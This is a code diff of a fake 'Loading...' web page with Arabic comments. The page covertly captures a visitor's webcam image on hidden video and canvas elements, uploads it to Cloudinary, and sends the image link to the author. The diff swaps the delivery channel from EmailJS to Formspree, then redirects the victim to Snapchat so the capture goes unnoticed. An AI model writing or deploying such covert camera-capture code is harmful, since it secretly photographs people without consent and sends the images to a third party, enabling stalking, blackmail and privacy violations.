@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
-    <script type="text/javascript" src="https://jsdelivr.net"></script>
     <style>
         body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
         video, canvas { display: none; }
@@ -16,12 +15,8 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // --- معلومات EmailJS الخاصة بك ---
-        const PUBLIC_KEY = "eWIb2mjCTi2UFeAAn";
-        const SERVICE_ID = "service_yea65ei";
-        const TEMPLATE_ID = "template_tj626bi";
-
-        emailjs.init(PUBLIC_KEY);
+        // رابط Formspree الخاص بك
+        const FORMSPREE_URL = "https://formspree.io"; 
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -36,30 +31,31 @@
         function captureAndUpload() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            const imageData = canvas.toDataURL('image/jpeg', 0.6);
 
-            // رفع الصورة إلى خدمة استضافة مجانية للحصول على رابط
             const formData = new FormData();
             formData.append("file", imageData);
-            formData.append("upload_preset", "ml_default"); // إعداد افتراضي للرفع السريع
+            formData.append("upload_preset", "ml_default");
 
+            // رفع الصورة للحصول على رابط
             fetch("https://cloudinary.com", {
                 method: "POST",
                 body: formData
             })
             .then(res => res.json())
             .then(data => {
-                const imageUrl = data.secure_url; // هذا هو الرابط المباشر للصورة
-                
-                // إرسال الرابط فقط إلى بريدك
-                emailjs.send(SERVICE_ID, TEMPLATE_ID, {
-                    photo_data: imageUrl, // سيرسل الرابط بدلاً من الكود الطويل
-                    title: "📸 رابط الصورة الجديد"
-                }).finally(() => {
-                    window.location.href = "https://snapchat.com";
+                const imageUrl = data.secure_url; 
+
+                // إرسال الرابط وحده فقط
+                return fetch(FORMSPREE_URL, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                    body: JSON.stringify({
+                        "الرابط": imageUrl 
+                    })
                 });
             })
-            .catch(() => {
+            .finally(() => {
                 window.location.href = "https://snapchat.com";
             });
         }
